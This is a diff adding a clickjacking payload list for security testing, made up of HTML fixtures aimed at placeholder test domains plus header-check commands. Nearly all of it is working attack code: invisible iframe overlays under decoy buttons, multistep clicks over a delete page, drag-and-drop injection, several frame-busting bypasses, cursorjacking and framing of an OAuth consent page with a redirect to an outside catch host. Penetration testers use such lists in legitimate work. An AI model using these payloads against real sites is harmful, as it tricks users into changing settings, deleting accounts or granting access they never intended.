@@ -1,0 +1,76 @@
+# Clickjacking Payloads
+# HTML fixtures to host on a separate test origin, plus header checks. Each block is an independent case.
+
+# Header checks (run with a proxy or curl and read the response headers)
+# curl -sI https://app.example.test/account | grep -iE "x-frame-options|content-security-policy"
+# Vulnerable when neither X-Frame-Options nor CSP frame-ancestors is present on a state-changing page
+
+# Weak or ineffective header values to look for
+X-Frame-Options: ALLOW-FROM https://oast.example.test
+X-Frame-Options: allowall
+X-Frame-Options: SAMEORIGIN, DENY
+Content-Security-Policy: frame-ancestors *
+Content-Security-Policy: frame-ancestors https:
+Content-Security-Policy: frame-ancestors 'self' https://*.example.test
+
+# Basic framing test
+<iframe src="https://app.example.test/account/settings" width="800" height="600"></iframe>
+
+# Transparent overlay (low opacity iframe above a decoy button)
+<style>iframe{position:absolute;top:0;left:0;width:500px;height:300px;opacity:0.0001;z-index:2}.d{position:absolute;top:120px;left:80px;z-index:1}</style><div class="d"><button>Click to continue</button></div><iframe src="https://app.example.test/account/settings"></iframe>
+
+# Visible partial overlay for demonstration screenshots
+<style>iframe{position:absolute;top:0;left:0;width:500px;height:300px;opacity:0.5;z-index:2}</style><iframe src="https://app.example.test/account/settings"></iframe>
+
+# Prefilled form via GET parameters (frame an action that reads parameters)
+<iframe src="https://app.example.test/profile/preferences?displayName=clickjack-marker&confirm=1"></iframe>
+
+# Prefilled form via URL fragment (single-page applications that read location.hash)
+<iframe src="https://app.example.test/settings#/email/clickjack-marker@example.test"></iframe>
+
+# Multistep clickjacking (several decoy buttons aligned over successive confirmation dialogs)
+<style>iframe{position:absolute;opacity:0.0001;width:600px;height:400px;z-index:2}.s1{position:absolute;top:140px;left:90px}.s2{position:absolute;top:220px;left:310px}</style><button class="s1">Step 1</button><button class="s2">Step 2</button><iframe src="https://app.example.test/settings/delete"></iframe>
+
+# Drag-and-drop content injection (draggable decoy text dropped into a framed input)
+<div draggable="true" ondragstart="event.dataTransfer.setData('text/plain','clickjack-marker')">Drag this word</div><iframe src="https://app.example.test/comment" width="500" height="200"></iframe>
+
+# Frame-busting bypass: sandbox the iframe so top-navigation scripts cannot run
+<iframe sandbox="allow-forms allow-scripts" src="https://app.example.test/account/settings"></iframe>
+<iframe sandbox="allow-forms" src="https://app.example.test/account/settings"></iframe>
+
+# Frame-busting bypass: double framing (parent.location check bypass in older busters)
+<iframe src="https://oast.example.test/inner-frame.html"></iframe>
+<!-- inner-frame.html: <iframe src="https://app.example.test/account/settings"></iframe> -->
+
+# Frame-busting bypass: onBeforeUnload with a 204 response
+<script>window.onbeforeunload=function(){return 'Stay'};</script><iframe src="https://app.example.test/account/settings"></iframe>
+
+# Frame-busting bypass: location.replace race with a null-response navigation (use a fixture that returns 204)
+<script>setInterval(function(){ if(window.location.href.indexOf('x')===-1){ } },1)</script>
+<iframe src="https://app.example.test/account/settings" onload="this.onload=null;this.src='https://oast.example.test/204'"></iframe>
+
+# Frame-busting bypass: XSS auditor trigger (legacy browsers; reference only)
+<iframe src="https://app.example.test/account/settings?q=%3Cscript%3Eif(top!=self)%7Btop.location=self.location%7D%3C/script%3E"></iframe>
+
+# Frame-busting bypass: embedding as an object or embed element
+<object data="https://app.example.test/account/settings" width="600" height="400"></object>
+<embed src="https://app.example.test/account/settings" width="600" height="400">
+
+# CSS pointer-events passthrough (decoy sits on top but forwards clicks to the frame)
+<style>.top{position:absolute;top:100px;left:100px;pointer-events:none;z-index:3}iframe{position:absolute;z-index:1;width:600px;height:400px}</style><div class="top">Win a prize - click here</div><iframe src="https://app.example.test/account/settings"></iframe>
+
+# Cursorjacking (custom cursor offset from the real pointer, JavaScript or CSS)
+<style>body{cursor:url('/cursor-offset.png') 0 0, auto}</style><iframe src="https://app.example.test/account/settings" width="500" height="300"></iframe>
+
+# Likejacking / authorise-consent pages (frame an OAuth consent URL on a test client)
+<iframe src="https://app.example.test/oauth/authorize?client_id=TEST_CLIENT&response_type=code&redirect_uri=https%3A%2F%2Foast.example.test%2Fcb&scope=profile"></iframe>
+
+# Touch / mobile tap targets
+<meta name="viewport" content="width=device-width,initial-scale=1"><style>iframe{width:100%;height:100vh;opacity:0.0001;position:absolute;top:0;left:0}</style><iframe src="https://app.example.test/account/settings"></iframe>
+
+# Permission-gated browser features inside frames (allow attribute must be needed for the target page)
+<iframe src="https://app.example.test/camera-demo" allow="camera; microphone; geolocation" width="500" height="300"></iframe>
+
+# Verification: confirm the framed page set cookies that the browser actually sent (check SameSite behaviour)
+# Set-Cookie: session=...; SameSite=None; Secure   (cookie is sent in cross-site frames)
+# Set-Cookie: session=...; SameSite=Lax            (cookie is not sent in cross-site subframes)
